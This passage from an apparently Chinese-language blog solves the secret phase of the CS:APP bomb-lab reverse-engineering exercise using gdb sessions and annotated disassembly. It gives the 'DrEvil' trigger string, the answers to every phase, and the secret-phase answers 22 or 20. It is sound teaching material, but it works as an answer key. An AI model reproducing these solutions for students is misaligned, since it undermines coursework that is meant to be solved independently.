<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 4015c4:	48 83 ec 78          	sub    $0x78,%rsp</span><br><span class="line"> 4015c8:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line"> 4015cf:	00 00 </span><br><span class="line"> 4015d1:	48 89 44 24 68       	mov    %rax,0x68(%rsp)</span><br><span class="line"> 4015d6:	31 c0                	xor    %eax,%eax</span><br><span class="line"> 4015d8:	83 3d 81 21 20 00 06 	cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line"> 4015df:	75 5e                	jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line"> ...</span><br><span class="line"> 40163f:	48 8b 44 24 68       	mov    0x68(%rsp),%rax</span><br><span class="line"> 401644:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line"> 40164b:	00 00 </span><br><span class="line"> 40164d:	74 05                	je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line"> 40164f:	e8 dc f4 ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 401654:	48 83 c4 78          	add    $0x78,%rsp</span><br><span class="line"> 401658:	c3                   	retq </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>4015c4～4015d1和40163f～401658的含义参见<a href="#stackCanacy"><code>phase_5</code>起始部分</a>。</p>
<p>4015d6将<code>%eax</code>赋为0，4015d8和4015df判断<code>%rip+0x202181</code>指向的值是否为6:</p>
<ul>
<li>若不为6则跳到40163f（4015c4+0x7b）继续执行并<strong>返回</strong>；</li>
<li>若为6则继续执行</li>
</ul>
<p>可以看出，只有当<code>%rip+0x202181</code>指向的值为6时才会继续执行。</p>
<p>结合4015d8右侧的注释可以发现，<code>%rip+0x202181</code>的地址为<code>0x603760</code>，再次<code>gdb</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/d 0x603760</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x603760 &lt;num_input_strings&gt;:   0</span><br></pre></td></tr></table></figure>
<p>发现<code>0x603760</code>指向的值为0，而结合<code>&lt;num_input_strings&gt;</code>名称可以<strong>推测</strong>此地址指向的值是一个<strong>计数器</strong>，用于记录我们通过了几个<code>phase</code>。</p>
<p>下面进行验证，利用<code>gdb</code>打断点，查看每次通过<code>phase</code>后<code>0x603760</code>指向的值的变化（输入和输出一同列出，省略了文件路径）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   0</span><br><span class="line">(gdb) b explode_bomb</span><br><span class="line">Breakpoint 1 at 0x40143a</span><br><span class="line">(gdb) b phase_1</span><br><span class="line">Breakpoint 2 at 0x400ee0</span><br><span class="line">(gdb) b phase_2</span><br><span class="line">Breakpoint 3 at 0x400efc</span><br><span class="line">(gdb) b phase_3</span><br><span class="line">Breakpoint 4 at 0x400f43</span><br><span class="line">(gdb) b phase_4</span><br><span class="line">Breakpoint 5 at 0x40100c</span><br><span class="line">(gdb) b phase_5</span><br><span class="line">Breakpoint 6 at 0x401062</span><br><span class="line">(gdb) b phase_6</span><br><span class="line">Breakpoint 7 at 0x4010f4</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /.../bomb </span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000000000400ee0 in phase_1 ()</span><br><span class="line">(gdb) x/d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   1</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400efc in phase_2 ()</span><br><span class="line">(gdb) x/d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   2</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br><span class="line">0 207</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x0000000000400f43 in phase_3 ()</span><br><span class="line">(gdb) x/d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   3</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Halfway there!</span><br><span class="line">0 0</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x000000000040100c in phase_4 ()</span><br><span class="line">(gdb) x/d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   4</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">9/N567</span><br><span class="line"></span><br><span class="line">Breakpoint 5, 0x0000000000401062 in phase_5 ()</span><br><span class="line">(gdb) x/d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   5</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line"></span><br><span class="line">Breakpoint 6, 0x00000000004010f4 in phase_6 ()</span><br><span class="line">(gdb) x/d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   6</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Congratulations! You&#x27;ve defused the bomb!</span><br><span class="line">[Inferior 1 (process 8462) exited normally]</span><br></pre></td></tr></table></figure>
<p>可以发现，每次成功通过一个<code>phase</code>后，<code>0x603760</code>指向的值都会加1。而此处判断当<code>0x603760</code>指向的值为6时才会进行，即只有成功通过6个<code>phase</code>后，<code>phase_defused</code>函数才会继续执行4015e1及后续部分</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4015e1:	4c 8d 44 24 10       	lea    0x10(%rsp),%r8</span><br><span class="line">4015e6:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">4015eb:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">4015f0:	be 19 26 40 00       	mov    $0x402619,%esi</span><br><span class="line">4015f5:	bf 70 38 60 00       	mov    $0x603870,%edi</span><br><span class="line">4015fa:	e8 f1 f5 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>
<p><code>0x603760</code>指向的值为6时，继续执行4015e1将<code>%rsp+16</code>的地址给<code>%r8</code>，4015e6将<code>%rsp+12</code>的地址给<code>%rcx</code>，4015eb将<code>%rsp+8</code>的地址给<code>%rdx</code>，4015f0将地址<code>0x402619</code>给<code>%esi</code>，4015f5将地址<code>0x603870</code>给<code>%edi</code>，4015fa又调用了<code>sscanf</code>函数，<strong>推测</strong>地址<code>0x402619</code>指向的可能是一个格式化字符串，<code>gdb</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x402619</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x402619:       &quot;%d %d %s&quot;</span><br></pre></td></tr></table></figure>
<p>不出所料，我们应该在某处输入两个整数（存放于<code>%rsp+8</code>和<code>%rsp+12</code>中），再输入一个字符串（存放于<code>%rsp+16</code>中）。</p>
<p>回忆6个<code>phase</code>，发现没有一个<code>phase</code>的密码符合这种格式，但是<code>phase_3</code>和<code>phase_4</code>的密码均为两个整数。<strong>推测</strong>可能在<code>phase_3</code>或<code>phase_4</code>输入两个整数后，再输入一个字符串，可能就会开启<code>secret_phase</code>。</p>
<p>注意此时还有一个地址<code>0x603870</code>被传给了<code>%edi</code>，<strong>推测</strong>可能指向一个字符串用于和输入的字符串进行比对。</p>
<p>直接<code>gdb</code>查看<code>0x603870</code>指向的值：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x603870</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;&quot;</span><br></pre></td></tr></table></figure>
<p>发现是空字符串，说明推测错误。再次推测，<code>0x603870</code>指向的值不可能一直是空字符串，<strong>推测</strong>它可能会随着我们输入密码而发生变化。使用<code>gdb</code>，并在<code>phase_defused</code>入口处打一个断点（输入和输出一同列出，省略了文件路径）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) b phase_defused</span><br><span class="line">Breakpoint 8 at 0x4015c4</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /.../bomb </span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000000000400ee0 in phase_1 ()</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;&quot;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 8, 0x00000000004015c4 in phase_defused ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400efc in phase_2 ()</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;&quot;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 8, 0x00000000004015c4 in phase_defused ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br><span class="line">0 207</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x0000000000400f43 in phase_3 ()</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;&quot;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 8, 0x00000000004015c4 in phase_defused ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Halfway there!</span><br><span class="line">0 0</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x000000000040100c in phase_4 ()</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;0 0&quot;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 8, 0x00000000004015c4 in phase_defused ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">9/N567</span><br><span class="line"></span><br><span class="line">Breakpoint 5, 0x0000000000401062 in phase_5 ()</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;0 0&quot;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 8, 0x00000000004015c4 in phase_defused ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line"></span><br><span class="line">Breakpoint 6, 0x00000000004010f4 in phase_6 ()</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;0 0&quot;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 8, 0x00000000004015c4 in phase_defused ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Congratulations! You&#x27;ve defused the bomb!</span><br><span class="line">[Inferior 1 (process 13412) exited normally]</span><br></pre></td></tr></table></figure>
<p>可以发现，在通过<code>phase_4</code>后，<code>0x603870</code>指向的值发生了变化——变成了我们输入的<code>&quot;0 0&quot;</code>（不应认为此时<code>0x603870</code>指向的值就是<code>&quot;0 0&quot;</code>，而是会因我们输入的<code>phase_4</code>密码的不同而不同，此处可以自行验证当输入不同的的<code>phase_4</code>密码时<code>0x603870</code>指向的值，同时也可以理解<code>phase_4</code>密码存在多种可能性的原因）</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4015ff:	83 f8 03             	cmp    $0x3,%eax</span><br><span class="line">401602:	75 31                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">...</span><br><span class="line">401630:	e8 0d fc ff ff       	callq  401242 &lt;secret_phase&gt;</span><br><span class="line">401635:	bf 58 25 40 00       	mov    $0x402558,%edi</span><br></pre></td></tr></table></figure>
<p>继续执行4015ff和401602判断<code>%eax</code>（<code>sscanf</code>函数的返回值）是否为3：</p>
<ul>
<li>若为3则继续执行；</li>
<li>若不为3则跳到401635（4015c4+0x71）继续执行输出提示信息</li>
</ul>
<p>结合后续语句可以看出，<code>secret_phase</code>在401630处被调用，若跳到401635则跳过了<code>secret_phase</code>的调用，且不会再跳回来。即要想进入<code>secret_phase</code>，则<code>sscanf</code>函数的返回值必须为3，也就是说<code>0x603870</code>指向的值（<strong>输入的<code>phase_4</code>的密码</strong>）<strong>除了两个整数，必须还要有一个字符串</strong></p>
<p>这个额外输入的字符串是什么？继续分析～</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401604:	be 22 26 40 00       	mov    $0x402622,%esi</span><br><span class="line">401609:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">40160e:	e8 25 fd ff ff       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">401613:	85 c0                	test   %eax,%eax</span><br><span class="line">401615:	75 1e                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">...</span><br><span class="line">401630:	e8 0d fc ff ff       	callq  401242 &lt;secret_phase&gt;</span><br><span class="line">401635:	bf 58 25 40 00       	mov    $0x402558,%edi</span><br></pre></td></tr></table></figure>
<p>401604将地址<code>0x402622</code>给<code>%esi</code>，401609把<code>%rsp+16</code>的地址（指向在两个整数后输入的字符串）给<code>%rdi</code>，40160e调用<code>strings_not_equal</code>函数判断两个字符串是否相等（相等返回0，不等返回1），401613和401615判断<code>%eax</code>（<code>strings_not_equal</code>函数的返回值）是否为0：</p>
<ul>
<li>若为0则继续执行；</li>
<li>若不为0则跳到401635（4015c4+0x71）继续执行输出提示信息</li>
</ul>
<p>和上述分析相同，地址<code>0x402622</code>指向的应该是一个字符串，且要想进入<code>secret_phase</code>，在两个整数后输入的字符串必须和此字符串相等。利用<code>gdb</code>查看地址<code>0x402622</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x402622</span><br></pre></td></tr></table></figure>
<p> 得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x402622:       &quot;DrEvil&quot;</span><br></pre></td></tr></table></figure>
<p>即<code>bomb.c</code>文件开头注释部分提到的“犯罪者”的名字</p>
<p>至此，我们已经找到了开启<code>secret_phase</code>大门的入口——**在<code>phase_4</code>输入密码时额外输入字符串<code>&quot;DrEvil&quot;</code>**。</p>
<h2 id="Defuse"><a href="#Defuse" class="headerlink" title="Defuse"></a>Defuse</h2><p><code>secret_phase</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:	53                   	push   %rbx</span><br><span class="line">  401243:	e8 56 02 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:	ba 0a 00 00 00       	mov    $0xa,%edx</span><br><span class="line">  40124d:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401252:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  401255:	e8 76 f9 ff ff       	callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  40125a:	48 89 c3             	mov    %rax,%rbx</span><br><span class="line">  40125d:	8d 40 ff             	lea    -0x1(%rax),%eax</span><br><span class="line">  401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax</span><br><span class="line">  401265:	76 05                	jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:	e8 ce 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:	89 de                	mov    %ebx,%esi</span><br><span class="line">  40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi</span><br><span class="line">  401273:	e8 8c ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40127b:	74 05                	je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:	e8 b8 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:	bf 38 24 40 00       	mov    $0x402438,%edi</span><br><span class="line">  401287:	e8 84 f8 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:	e8 33 03 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:	5b                   	pop    %rbx</span><br><span class="line">  401292:	c3                   	retq   </span><br><span class="line">  401293:	90                   	nop</span><br><span class="line">  401294:	90                   	nop</span><br><span class="line">  401295:	90                   	nop</span><br><span class="line">  401296:	90                   	nop</span><br><span class="line">  401297:	90                   	nop</span><br><span class="line">  401298:	90                   	nop</span><br><span class="line">  401299:	90                   	nop</span><br><span class="line">  40129a:	90                   	nop</span><br><span class="line">  40129b:	90                   	nop</span><br><span class="line">  40129c:	90                   	nop</span><br><span class="line">  40129d:	90                   	nop</span><br><span class="line">  40129e:	90                   	nop</span><br><span class="line">  40129f:	90                   	nop</span><br></pre></td></tr></table></figure>
<hr>
<p>分段分析：</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401242:	53                   	push   %rbx</span><br><span class="line">401243:	e8 56 02 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">401248:	ba 0a 00 00 00       	mov    $0xa,%edx</span><br><span class="line">40124d:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">401252:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">401255:	e8 76 f9 ff ff       	callq  400bd0 &lt;strtol@plt&gt;</span><br></pre></td></tr></table></figure>
<p>401243调用<code>read_line</code>函数读取一行字符串（返回值存放于<code>%rax</code>），401248将<code>%edx</code>赋为10，40124d将<code>%esi</code>赋为0，401252将<code>%rax</code>（<code>read_line</code>函数返回值）赋给<code>%rdi</code>，401255调用<code>strtol</code>函数（<a href="http://www.cplusplus.com/reference/cstdlib/strtol/">什么是<code>strtol</code>函数？</a>）。</p>
<p><code>strtol</code>函数将字符串转化为<code>long</code>型整数：<code>%rdi</code>作为传入的第1个参数，作为用来解析的字符串（输入串）；<code>%esi</code>作为传入的第2个参数，作为需要解析部分的结束地址（<code>NULL</code>）；<code>%edx</code>作为整数的进制（<code>10</code>代表十进制）。函数的返回值存放于<code>%rax</code>中</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40125a:	48 89 c3             	mov    %rax,%rbx</span><br><span class="line">40125d:	8d 40 ff             	lea    -0x1(%rax),%eax</span><br><span class="line">401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax</span><br><span class="line">401265:	76 05                	jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">401267:	e8 ce 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">40126c:	89 de                	mov    %ebx,%esi</span><br><span class="line">40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi</span><br><span class="line">401273:	e8 8c ff ff ff       	callq  401204 &lt;fun7&gt;</span><br></pre></td></tr></table></figure>
<p>40125a将<code>%rax</code>（<code>strtol</code>函数的返回值）赋给<code>%rbx</code>，40125d将<code>%rax-1</code>的地址给<code>%eax</code>，401260和401265判断<code>%eax</code>是否不超过1000：</p>
<ul>
<li><p>若超过1000则继续执行401267使炸弹爆炸（由此得知<strong>应使<code>strtol</code>函数的返回值不超过1001（无符号数）</strong>）；</p>
</li>
<li><p>若不超过1000则跳到40126c（401242+0x2a）将<code>%ebx</code>（<code>strtol</code>函数的返回值）赋给<code>%esi</code>，40126e将地址<code>0x6030f0</code>赋给<code>%edi</code>，401273<span id = "backToSec">调用函数<code>fun7</code></span>，<a href="#fun7">点此分析<code>fun7</code>函数</a></p>
<p><code>gdb</code>查看地址<code>0x6030f0</code>（<code>fun7</code>的第一个参数）（多次查看可知，只有前60个连续内存是相关的，后面均为无关数据）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/60a 0x6030f0</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x6030f0 &lt;n1&gt;:  0x24    0x603110 &lt;n21&gt;</span><br><span class="line">0x603100 &lt;n1+16&gt;:       0x603130 &lt;n22&gt;  0x0</span><br><span class="line">0x603110 &lt;n21&gt;: 0x8     0x603190 &lt;n31&gt;</span><br><span class="line">0x603120 &lt;n21+16&gt;:      0x603150 &lt;n32&gt;  0x0</span><br><span class="line">0x603130 &lt;n22&gt;: 0x32    0x603170 &lt;n33&gt;</span><br><span class="line">0x603140 &lt;n22+16&gt;:      0x6031b0 &lt;n34&gt;  0x0</span><br><span class="line">0x603150 &lt;n32&gt;: 0x16    0x603270 &lt;n43&gt;</span><br><span class="line">0x603160 &lt;n32+16&gt;:      0x603230 &lt;n44&gt;  0x0</span><br><span class="line">0x603170 &lt;n33&gt;: 0x2d    0x6031d0 &lt;n45&gt;</span><br><span class="line">0x603180 &lt;n33+16&gt;:      0x603290 &lt;n46&gt;  0x0</span><br><span class="line">0x603190 &lt;n31&gt;: 0x6     0x6031f0 &lt;n41&gt;</span><br><span class="line">0x6031a0 &lt;n31+16&gt;:      0x603250 &lt;n42&gt;  0x0</span><br><span class="line">0x6031b0 &lt;n34&gt;: 0x6b    0x603210 &lt;n47&gt;</span><br><span class="line">0x6031c0 &lt;n34+16&gt;:      0x6032b0 &lt;n48&gt;  0x0</span><br><span class="line">0x6031d0 &lt;n45&gt;: 0x28    0x0</span><br><span class="line">0x6031e0 &lt;n45+16&gt;:      0x0     0x0</span><br><span class="line">0x6031f0 &lt;n41&gt;: 0x1     0x0</span><br><span class="line">0x603200 &lt;n41+16&gt;:      0x0     0x0</span><br><span class="line">0x603210 &lt;n47&gt;: 0x63    0x0</span><br><span class="line">0x603220 &lt;n47+16&gt;:      0x0     0x0</span><br><span class="line">0x603230 &lt;n44&gt;: 0x23    0x0</span><br><span class="line">0x603240 &lt;n44+16&gt;:      0x0     0x0</span><br><span class="line">0x603250 &lt;n42&gt;: 0x7     0x0</span><br><span class="line">0x603260 &lt;n42+16&gt;:      0x0     0x0</span><br><span class="line">0x603270 &lt;n43&gt;: 0x14    0x0</span><br><span class="line">0x603280 &lt;n43+16&gt;:      0x0     0x0</span><br><span class="line">0x603290 &lt;n46&gt;: 0x2f    0x0</span><br><span class="line">0x6032a0 &lt;n46+16&gt;:      0x0     0x0</span><br><span class="line">0x6032b0 &lt;n48&gt;: 0x3e9   0x0</span><br><span class="line">0x6032c0 &lt;n48+16&gt;:      0x0     0x0</span><br></pre></td></tr></table></figure>
<p>可以发现这是一棵二叉树，其中<code>&lt;nab&gt;</code>表示第<code>a</code>层从左向右数的第<code>b</code>个结点，且数值依次为结点数据、左子树地址、右子树地址。画出二叉树（十六进制）：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/hex.jpeg" alt="hex"></p>
<p>转换成十进制：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/dec.jpeg" alt="dec"></p>
<p>即传入<code>fun7</code>函数的第一个参数就是此二叉树根结点的地址。结合<code>fun7</code>函数改写的C语句：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(<span class="keyword">int</span>* p_node, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">  	<span class="keyword">if</span> (p_node == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">    num = *p_node;<span class="comment">// current node</span></span><br><span class="line">    <span class="keyword">if</span> (num &lt;= target) &#123;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (num == target)</span><br><span class="line">        <span class="keyword">return</span> result;<span class="comment">// 0</span></span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">      	p_node = *(p_node + <span class="number">2</span>);<span class="comment">// right child</span></span><br><span class="line">      	result = fun7(p_node, target);</span><br><span class="line">      	<span class="keyword">return</span> result * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      p_node = *(p_node + <span class="number">1</span>);<span class="comment">// left child</span></span><br><span class="line">      result = fun7(p_node, target);</span><br><span class="line">    <span class="keyword">return</span> result * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现<code>fun7</code>函数的功能是：</p>
<ul>
<li>若当前结点为空，则返回<code>0xffffffff</code>；</li>
<li>若当前结点数据为<code>target</code>，则返回<code>0</code>；</li>
<li>若当前结点数据小于<code>target</code>，则继续搜索右子树，返回右子树搜索返回值的2倍+1；</li>
<li>若当前结点数据大于<code>target</code>，则继续搜索左子树，返回左子树搜索返回值的2倍</li>
</ul>
</li>
</ul>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401278:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">40127b:	74 05                	je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">40127d:	e8 b8 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401282:	bf 38 24 40 00       	mov    $0x402438,%edi</span><br><span class="line">401287:	e8 84 f8 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">40128c:	e8 33 03 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">401291:	5b                   	pop    %rbx</span><br><span class="line">401292:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>401278判断<code>%eax</code>（<code>fun7</code>函数的返回值）是否为2：</p>
<ul>
<li>若不为2则继续执行40127d使炸弹爆炸（由此得知**<code>fun7</code>函数的返回值须为2**）；</li>
<li>若为2则跳到401282（401242+0x40）将地址<code>0x402438</code>赋给<code>%edi</code>，401287调用<code>puts</code>函数，40128c调用<code>phase_defused</code>函数，401291和401292弹栈<strong>返回</strong></li>
</ul>
<p><code>gdb</code>查看地址<code>0x402438</code>指向的值：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x402438</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x402438:       &quot;Wow! You&#x27;ve defused the secret stage!&quot;</span><br></pre></td></tr></table></figure>
<p>可以看出之后调用函数即输出文本，至此拆弹结束。</p>
<hr>
<p>综合以上分析，<code>secret_phase</code>的密码就是<strong>使<code>fun7</code>函数的返回值为2的<code>target</code>值</strong>。</p>
<p>什么时候<code>fun7</code>函数的返回值为2？再次观察二叉树的值：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/dec.jpeg" alt="dec"></p>
<p>发现左子树各结点数值均小于根结点、右子树各结点数值均大于根结点——这是一棵<strong>二叉排序树（Binary Search Tree，BST）</strong>。</p>
<p>观察<code>fun7</code>函数：</p>
<blockquote>
<ul>
<li>若当前结点为空，则返回<code>0xffffffff</code>；</li>
<li>若当前结点数据为<code>target</code>，则返回<code>0</code>；</li>
<li>若当前结点数据小于<code>target</code>，则继续搜索右子树，返回右子树搜索返回值的2倍+1；</li>
<li>若当前结点数据大于<code>target</code>，则继续搜索左子树，返回左子树搜索返回值的2倍。</li>
</ul>
</blockquote>
<p>分析：</p>
<ul>
<li><p>顺推（从根结点开始）：</p>
<p>最终一定找到数值等于<code>target</code>的结点（即<code>target</code>一定在树中）；</p>
</li>
<li><p>逆推（从值为<code>target</code>的结点开始）：</p>
<ul>
<li>开始可以有任意次<code>0</code>，即可以先沿右路（顺推时的左子树）返回任意次（<code>2*0=0</code>）；</li>
<li>倒数第二次一定沿左路（顺推时的右子树）返回（<code>2*(2*0)+1=2*0+1=1</code>）；</li>
<li>最后一次一定沿右路（顺推时的左子树）返回到根结点（<code>2*(2*(2*0)+1)=2*(2*0+1)=2*1=2</code>）。</li>
</ul>
</li>
</ul>
<p>得出结论：</p>
<ul>
<li>若逆推开始沿右路返回0次，则为<code>22</code>；</li>
<li>若逆推开始沿右路返回1次，则为<code>20</code>。</li>
</ul>
<p>至此，得到<code>secret_phase</code>的password为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">22</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">20</span><br></pre></td></tr></table></figure>
<h1 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h1><p>下面是拆弹过程中遇到的一些函数：</p>
<hr>
